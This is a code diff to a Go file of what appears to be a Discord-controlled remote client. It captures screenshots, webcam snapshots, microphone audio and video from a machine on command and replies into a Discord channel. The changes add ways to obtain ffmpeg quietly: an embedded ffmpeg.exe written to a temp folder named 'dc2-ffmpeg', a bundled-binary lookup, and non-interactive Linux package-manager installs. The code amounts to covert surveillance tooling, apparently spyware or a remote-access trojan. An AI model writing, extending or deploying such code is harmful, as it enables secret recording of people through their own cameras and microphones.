@@ -1,9 +1,5 @@
 package actions
 
-// This file contains media-related actions invoked by the Discord client,
-// including screenshots, camera snapshots, microphone recording, and segmented
-// video capture on Windows.
-
 import (
 	"fmt"
 	"image/png"
@@ -46,88 +42,144 @@ var (
 	}{
 		Status: "idle",
 	}
+	ffmpegExecPath = "ffmpeg"
 )
+func getFFmpegExec() string {
+	return ffmpegExecPath
+}
 
-// ensureFFmpegAvailable verifies that ffmpeg can be executed. On Windows it
-// tries to install ffmpeg via winget and/or locate it in common paths.
-func ensureFFmpegAvailable(s *discordgo.Session, channelID string, ref *discordgo.MessageReference) bool {
-	if _, err := exec.LookPath("ffmpeg"); err == nil {
+// ensureFFmpegAvailable verifies that ffmpeg can be executed. It first checks
+// PATH, then looks for a bundled ffmpeg binary next to the executable, and on
+// Linux it can attempt installation via the system package manager.
+func EnsureFFmpegAvailable(s *discordgo.Session, channelID string, ref *discordgo.MessageReference) bool {
+	if p, err := exec.LookPath("ffmpeg"); err == nil {
+		ffmpegExecPath = p
+		log.Printf("FFMPEG found in PATH at %s", p)
 		return true
 	}
 	log.Printf("FFMPEG not found in PATH")
-	if runtime.GOOS != "windows" {
+	if bundled, err := findBundledFFmpeg(); err == nil && bundled != "" {
+		ffmpegExecPath = bundled
+		log.Printf("FFMPEG using bundled binary at %s", bundled)
+		return true
+	}
+	switch runtime.GOOS {
+	case "linux":
+		if s != nil {
+			s.ChannelMessageSendReply(channelID, "ffmpeg not found. Attempting installation via package manager on Linux...", ref)
+		}
+		if installFFmpegLinux() {
+			if p, err := exec.LookPath("ffmpeg"); err == nil {
+				ffmpegExecPath = p
+				log.Printf("FFMPEG available after Linux package install")
+				return true
+			}
+		}
+		if s != nil {
+			s.ChannelMessageSendReply(channelID, "ffmpeg installation on Linux failed or ffmpeg is still not accessible.", ref)
+		}
+		return false
+	case "windows":
+		if len(embeddedFFmpegWin) > 0 {
+			path, err := writeEmbeddedFFmpeg()
+			if err == nil {
+				ffmpegExecPath = path
+				log.Printf("FFMPEG extracted embedded binary to %s", path)
+				return true
+			}
+			log.Printf("Failed to write embedded ffmpeg: %v", err)
+		}
+		if s != nil {
+			s.ChannelMessageSendReply(channelID, "ffmpeg is required but not found. Ensure ffmpeg.exe is available in PATH.", ref)
+		}
+		return false
+	default:
 		if s != nil {
 			s.ChannelMessageSendReply(channelID, "ffmpeg is required but not found in PATH.", ref)
 		}
 		return false
 	}
-	if s != nil {
-		s.ChannelMessageSendReply(channelID, "ffmpeg not found. Attempting installation via winget on Windows...", ref)
+}
+
+func installFFmpegLinux() bool {
+	installers := []struct {
+		bin  string
+		args []string
+	}{
+		{"apt-get", []string{"install", "-y", "ffmpeg"}},
+		{"dnf", []string{"install", "-y", "ffmpeg"}},
+		{"yum", []string{"install", "-y", "ffmpeg"}},
+		{"zypper", []string{"install", "-y", "ffmpeg"}},
+		{"pacman", []string{"-Sy", "--noconfirm", "ffmpeg"}},
 	}
-	wingetPath, err := exec.LookPath("winget")
-	if err != nil {
-		log.Printf("winget not found in PATH: %v", err)
-		if s != nil {
-			s.ChannelMessageSendReply(channelID, "winget is not available. Please install ffmpeg manually and ensure it is in PATH.", ref)
+	for _, inst := range installers {
+		if _, err := exec.LookPath(inst.bin); err != nil {
+			continue
 		}
-		return false
-	}
-	log.Printf("Using winget at %s to install ffmpeg", wingetPath)
-	cmd := exec.Command(wingetPath,
-		"install",
-		"--id=Gyan.FFmpeg",
-		"-e",
-		"--source=winget",
-		"--accept-package-agreements",
-		"--accept-source-agreements",
-		"--silent",
-	)
-	out, err := cmd.CombinedOutput()
-	if err != nil {
-		log.Printf("winget ffmpeg install error: %v, output=%s", err, string(out))
-		if s != nil {
-			s.ChannelMessageSendReply(channelID, "ffmpeg installation via winget failed. Please install ffmpeg manually and ensure it is in PATH.", ref)
+		log.Printf("Attempting ffmpeg install using %s", inst.bin)
+		cmd := exec.Command(inst.bin, inst.args...)
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			log.Printf("%s ffmpeg install error: %v, output=%s", inst.bin, err, string(out))
+			continue
 		}
-		return false
-	}
-	log.Printf("winget ffmpeg install output: %s", string(out))
-	if _, err := exec.LookPath("ffmpeg"); err == nil {
-		log.Printf("FFMPEG available after winget install")
+		log.Printf("%s ffmpeg install output: %s", inst.bin, string(out))
 		return true
 	}
-	commonPaths := []string{
-		`C:\Program Files\ffmpeg\bin`,
-		`C:\Program Files (x86)\ffmpeg\bin`,
+	log.Printf("No supported Linux package manager found for ffmpeg install")
+	return false
+}
+
+func writeEmbeddedFFmpeg() (string, error) {
+	dir := filepath.Join(os.TempDir(), "dc2-ffmpeg")
+	if err := os.MkdirAll(dir, 0755); err != nil {
+		return "", err
 	}
-	for _, p := range commonPaths {
-		if fi, err := os.Stat(p); err == nil && fi.IsDir() {
-			pathEnv := os.Getenv("PATH")
-			if !strings.Contains(pathEnv, p) {
-				newPath := p + ";" + pathEnv
-				os.Setenv("PATH", newPath)
-				log.Printf("Added %s to PATH for current process", p)
-			}
-			if _, err := exec.LookPath("ffmpeg"); err == nil {
-				log.Printf("FFMPEG found after adding %s to PATH", p)
-				return true
-			}
+	path := filepath.Join(dir, "ffmpeg.exe")
+	if err := os.WriteFile(path, embeddedFFmpegWin, 0755); err != nil {
+		return "", err
+	}
+	return path, nil
+}
+
+func findBundledFFmpeg() (string, error) {
+	exePath, err := os.Executable()
+	if err != nil {
+		return "", err
+	}
+	exeDir := filepath.Dir(exePath)
+	var candidates []string
+	if runtime.GOOS == "windows" {
+		candidates = []string{
+			filepath.Join(exeDir, "ffmpeg", "ffmpeg.exe"),
+			filepath.Join(exeDir, "ffmpeg", "windows", "ffmpeg.exe"),
+			filepath.Join("ffmpeg", "ffmpeg.exe"),
+			filepath.Join("ffmpeg", "windows", "ffmpeg.exe"),
+		}
+	} else {
+		candidates = []string{
+			filepath.Join(exeDir, "ffmpeg", "ffmpeg"),
+			filepath.Join(exeDir, "ffmpeg", runtime.GOOS, "ffmpeg"),
+			filepath.Join("ffmpeg", "ffmpeg"),
+			filepath.Join("ffmpeg", runtime.GOOS, "ffmpeg"),
 		}
 	}
-	if s != nil {
-		s.ChannelMessageSendReply(channelID, "ffmpeg installation attempted but binary is still not accessible. You may need to restart or adjust PATH manually.", ref)
+	for _, c := range candidates {
+		if fi, err := os.Stat(c); err == nil && !fi.IsDir() {
+			return c, nil
+		}
 	}
-	return false
+	return "", nil
 }
 
 // detectWindowsDShowDevice inspects ffmpeg -list_devices output to find a
 // suitable DirectShow audio or video device name for Windows.
 func detectWindowsDShowDevice(kind string) string {
-	_, err := exec.LookPath("ffmpeg")
-	if err != nil {
-		log.Printf("DShow detect: ffmpeg not found in PATH: %v", err)
+	if !EnsureFFmpegAvailable(nil, "", nil) {
+		log.Printf("DShow detect: ffmpeg unavailable")
 		return ""
 	}
-	out, err := exec.Command("ffmpeg", "-list_devices", "true", "-f", "dshow", "-i", "dummy").CombinedOutput()
+	out, err := exec.Command(getFFmpegExec(), "-list_devices", "true", "-f", "dshow", "-i", "dummy").CombinedOutput()
 	if err != nil {
 		log.Printf("DShow detect: ffmpeg list_devices error: %v, output=%s", err, string(out))
 		return ""
@@ -247,11 +299,11 @@ func CameraSnapshot(s *discordgo.Session, channelID string, ref *discordgo.Messa
 			}
 		}
 		log.Printf("CAMERA windows device=%s", device)
-		if !ensureFFmpegAvailable(s, channelID, ref) {
+		if !EnsureFFmpegAvailable(s, channelID, ref) {
 			log.Printf("CAMERA ffmpeg unavailable on Windows")
 			return
 		}
-		cmd = exec.Command("ffmpeg", "-y", "-f", "dshow", "-i", device, "-vframes", "1", fileName)
+		cmd = exec.Command(getFFmpegExec(), "-y", "-f", "dshow", "-i", device, "-vframes", "1", fileName)
 	default:
 		log.Printf("CAMERA feature not implemented for OS: %s", runtime.GOOS)
 		s.ChannelMessageSendReply(channelID, "Camera feature does not exist yet for this OS (Windows only).", ref)
@@ -335,11 +387,11 @@ func MicRecord(s *discordgo.Session, channelID string, ref *discordgo.MessageRef
 			}
 		}
 		log.Printf("MIC ffmpeg windows device=%s", device)
-		if !ensureFFmpegAvailable(s, channelID, ref) {
+		if !EnsureFFmpegAvailable(s, channelID, ref) {
 			log.Printf("MIC ffmpeg unavailable on Windows")
 			return
 		}
-		cmd = exec.Command("ffmpeg", "-y", "-f", "dshow", "-i", device, "-t", durArg, "-ac", "1", "-ar", "16000", "-b:a", "64k", path)
+		cmd = exec.Command(getFFmpegExec(), "-y", "-f", "dshow", "-i", device, "-t", durArg, "-ac", "1", "-ar", "16000", "-b:a", "64k", path)
 	default:
 		log.Printf("MIC feature not implemented for OS: %s", runtime.GOOS)
 		s.ChannelMessageSendReply(channelID, "Microphone recording feature does not exist yet for this OS (Windows only).", ref)
@@ -447,7 +499,7 @@ func VideoRecord(s *discordgo.Session, channelID string, ref *discordgo.MessageR
 	if quality != "low" && quality != "medium" && quality != "high" {
 		quality = "medium"
 	}
-	if !ensureFFmpegAvailable(s, channelID, ref) {
+	if !EnsureFFmpegAvailable(s, channelID, ref) {
 		log.Printf("VIDEO ffmpeg unavailable on Windows")
 		videoStateMutex.Lock()
 		videoState.Status = "idle"
@@ -541,7 +593,7 @@ func VideoRecord(s *discordgo.Session, channelID string, ref *discordgo.MessageR
 			fileName,
 		)
 		log.Printf("VIDEO running ffmpeg part=%d: %v", part, args)
-		cmd := exec.Command("ffmpeg", args...)
+		cmd := exec.Command(getFFmpegExec(), args...)
 		stdin, _ := cmd.StdinPipe()
 		videoStateMutex.Lock()
 		if videoState.Status != "recording" || videoState.ChannelID != channelID {
